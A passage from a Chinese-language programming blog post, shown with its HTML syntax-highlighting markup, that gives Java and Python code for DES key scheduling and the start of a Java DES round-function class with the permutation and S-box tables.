class="class"><span class="keyword">class</span> <span class="title">Key</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] Movetimes = &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span>[] PC_1_LTABLE = &#123;<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">            <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>,</span><br><span class="line">            <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span>[] PC_1_RTABLE = &#123;<span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,</span><br><span class="line">            <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">            <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>,</span><br><span class="line">            <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span>[] PC_2_TABLE = &#123;<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line">            <span class="number">3</span>, <span class="number">28</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>,</span><br><span class="line">            <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">26</span>, <span class="number">8</span>,</span><br><span class="line">            <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>,</span><br><span class="line">            <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>,</span><br><span class="line">            <span class="number">30</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>,</span><br><span class="line">            <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">53</span>,</span><br><span class="line">            <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>&#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] Binarykey = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">64</span>];</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[][] Sonkey = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">16</span>][<span class="number">48</span>];</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">()</span><span class="comment">//(test pass) set Binarykey</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span>[] tmp = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">64</span>];</span><br><span class="line">        System.out.println(<span class="string">"Please input your Key ： "</span>);</span><br><span class="line">        String tmpchar = scan.next();</span><br><span class="line">        HextoBin hexto = <span class="keyword">new</span> HextoBin();</span><br><span class="line">        hexto.set(tmpchar);</span><br><span class="line">        String str2 = hexto.out();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">64</span>;i++)&#123;</span><br><span class="line">            Binarykey[i] = str2.charAt(i)-<span class="string">'0'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] result(<span class="keyword">int</span>[] txt,<span class="keyword">int</span> count)&#123;</span><br><span class="line">        <span class="keyword">int</span> lenth = txt.length;</span><br><span class="line">        <span class="keyword">int</span>[] tmptxt = <span class="keyword">new</span> <span class="keyword">int</span>[lenth];</span><br><span class="line">        <span class="keyword">if</span>(lenth &gt; <span class="number">28</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">"Your Result length is Error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">int</span> tmpnum = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = count;i &lt; lenth ;i++)&#123;</span><br><span class="line">                tmptxt[tmpnum] = txt[i];</span><br><span class="line">                tmpnum ++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; count;i++)&#123;</span><br><span class="line">                tmptxt[tmpnum+i] = txt[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> tmptxt;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[][] Main()&#123;</span><br><span class="line">        <span class="keyword">int</span> lenth = Binarykey.length;</span><br><span class="line">        <span class="keyword">if</span>(lenth != <span class="number">64</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">"Your  Key lenth is Error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String BinarykeyST = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i &lt; lenth;i++)&#123;</span><br><span class="line">            BinarykeyST += Binarykey[i];</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"Your  Binary Key is : "</span>+BinarykeyST);</span><br><span class="line">        <span class="keyword">int</span>[] L0 = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">28</span>];</span><br><span class="line">        <span class="keyword">int</span>[] R0 = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">28</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; PC_1_LTABLE.length;i++)&#123;</span><br><span class="line">            L0[i] = Binarykey[PC_1_LTABLE[i] - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; PC_1_LTABLE.length;i++)&#123;</span><br><span class="line">            R0[i] = Binarykey[PC_1_RTABLE[i] - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">16</span>;i++)&#123;</span><br><span class="line">            L0 = result(L0,Movetimes[i]);</span><br><span class="line">            R0 = result(R0,Movetimes[i]);</span><br><span class="line">            <span class="keyword">int</span>[] mergedKey = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">56</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; <span class="number">28</span>;j++)&#123;</span><br><span class="line">                mergedKey[j] = L0[j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">28</span>;j &lt; <span class="number">56</span>;j++)&#123;</span><br><span class="line">                mergedKey[j] = R0[j-<span class="number">28</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span>[] tempkey = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">48</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; PC_2_TABLE.length;j++)&#123;</span><br><span class="line">                tempkey[j] = mergedKey[PC_2_TABLE[j]-<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j&lt;<span class="number">48</span>;j++)&#123;</span><br><span class="line">                Sonkey[i][j] = tempkey[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Sonkey;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Python实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createkey</span><span class="params">(key)</span>:</span></span><br><span class="line">    Movetimes = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line">    PC_1_LTABLE = [<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>,</span><br><span class="line">             <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">             <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>,</span><br><span class="line">             <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>]</span><br><span class="line">    PC_1_RTABLE = [<span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,</span><br><span class="line">             <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">             <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>,</span><br><span class="line">             <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>]</span><br><span class="line">    PC_2_TABLE = [<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line">                        <span class="number">3</span>, <span class="number">28</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>,</span><br><span class="line">                        <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">26</span>, <span class="number">8</span>,</span><br><span class="line">                        <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>,</span><br><span class="line">                        <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>,</span><br><span class="line">                        <span class="number">30</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>,</span><br><span class="line">                        <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">53</span>,</span><br><span class="line">                        <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>]</span><br><span class="line">    <span class="keyword">if</span> len(key) != <span class="number">64</span> :</span><br><span class="line">        print(<span class="string">"Your Key lenth is Error!"</span>)</span><br><span class="line">        <span class="keyword">assert</span> len(key) == <span class="number">64</span><span class="comment">#if no 64bit error</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        L0 = <span class="string">""</span></span><br><span class="line">        R0 = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> PC_1_LTABLE:</span><br><span class="line">            L0 += key[i - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> PC_1_RTABLE:</span><br><span class="line">            R0 += key[i - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">assert</span> len(L0) == <span class="number">28</span> <span class="comment">#if no 28bit error</span></span><br><span class="line">        <span class="keyword">assert</span> len(R0) == <span class="number">28</span></span><br><span class="line">        Sonkey = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">            print(<span class="string">"Movetimes : "</span>,i)</span><br><span class="line">            L0 = result(L0, Movetimes[i])</span><br><span class="line">            R0 = result(R0, Movetimes[i])</span><br><span class="line">            print(<span class="string">"L0 : "</span>, L0)</span><br><span class="line">            print(<span class="string">"R0 : "</span>, R0)</span><br><span class="line">            mergedKey = L0 + R0</span><br><span class="line">            tempkey = <span class="string">""</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> PC_2_TABLE:</span><br><span class="line">                tempkey += mergedKey[j - <span class="number">1</span>]</span><br><span class="line">            <span class="keyword">assert</span> len(tempkey) == <span class="number">48</span></span><br><span class="line">            print(<span class="string">"Your NO."</span>,i,<span class="string">" Sonkey :"</span>,tempkey)</span><br><span class="line">            Sonkey.append(tempkey)</span><br><span class="line">        <span class="keyword">return</span> Sonkey</span><br></pre></td></tr></table></figure><h4 id="DES轮函数实现"><a href="#DES轮函数实现" class="headerlink" title="DES轮函数实现"></a>DES轮函数实现</h4><p>Java实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DES</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">intToHex</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        StringBuffer s = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        String a;</span><br><span class="line">        <span class="keyword">char</span> []b = &#123;<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'F'</span>&#125;;</span><br><span class="line">        <span class="keyword">while</span>(n != <span class="number">0</span>)&#123;</span><br><span class="line">            s = s.append(b[n%<span class="number">16</span>]);</span><br><span class="line">            n = n/<span class="number">16</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        a = s.reverse().toString();</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String hexStr =  <span class="string">"0123456789ABCDEF"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String[] binaryArray =</span><br><span class="line">            &#123;<span class="string">"0000"</span>,<span class="string">"0001"</span>,<span class="string">"0010"</span>,<span class="string">"0011"</span>,</span><br><span class="line">                    <span class="string">"0100"</span>,<span class="string">"0101"</span>,<span class="string">"0110"</span>,<span class="string">"0111"</span>,</span><br><span class="line">                    <span class="string">"1000"</span>,<span class="string">"1001"</span>,<span class="string">"1010"</span>,<span class="string">"1011"</span>,</span><br><span class="line">                    <span class="string">"1100"</span>,<span class="string">"1101"</span>,<span class="string">"1110"</span>,<span class="string">"1111"</span>&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">bin2HexStr</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span></span>&#123;</span><br><span class="line">        String result = <span class="string">""</span>;</span><br><span class="line">        String hex = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;bytes.length;i++)&#123;</span><br><span class="line">            <span class="comment">//字节高4位</span></span><br><span class="line">            hex = String.valueOf(hexStr.charAt((bytes[i]&amp;<span class="number">0xF0</span>)&gt;&gt;<span class="number">4</span>));</span><br><span class="line">            <span class="comment">//字节低4位</span></span><br><span class="line">            hex += String.valueOf(hexStr.charAt(bytes[i]&amp;<span class="number">0x0F</span>));</span><br><span class="line">            result +=hex;  <span class="comment">//+" "</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    String ClearTxt = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] BinaryClearTxt = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">64</span>];</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[][] Sonkey = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">16</span>][<span class="number">48</span>];</span><br><span class="line">    <span class="keyword">int</span>[] ret = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">64</span>];</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] IP(<span class="keyword">int</span>[] BinaryClearTxt)&#123;</span><br><span class="line">        <span class="keyword">int</span>[] IPTABLE = &#123;<span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>,</span><br><span class="line">                <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">                <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>,</span><br><span class="line">                <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">                <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>,</span><br><span class="line">                <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">                <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>,</span><br><span class="line">                <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>&#125;;</span><br><span class="line">        <span class="keyword">if</span>(BinaryClearTxt.length != <span class="number">64</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">"Your key Text lenth is Error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; IPTABLE.length;i++)&#123;</span><br><span class="line">                ret[i] = BinaryClearTxt[IPTABLE[i]-<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.print(<span class="string">"Source ClearText : "</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;BinaryClearTxt.length;i++)&#123;</span><br><span class="line">                System.out.print(BinaryClearTxt[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">expend</span><span class="params">(String Rn)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] ETABLE = &#123;<span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>,</span><br><span class="line">                <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,</span><br><span class="line">                <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>,</span><br><span class="line">                <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line">                <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">                <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,</span><br><span class="line">                <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>,</span><br><span class="line">                <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">1</span>&#125;;</span><br><span class="line">        String retRn = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i&lt;ETABLE.length;i++)&#123;</span><br><span class="line">            retRn += Rn.charAt(ETABLE[i]-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> retRn;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">S_sub</span><span class="params">(String S_Input)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[][] STABLE = &#123;&#123;<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>,</span><br><span class="line">                <span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">10</span>, <span 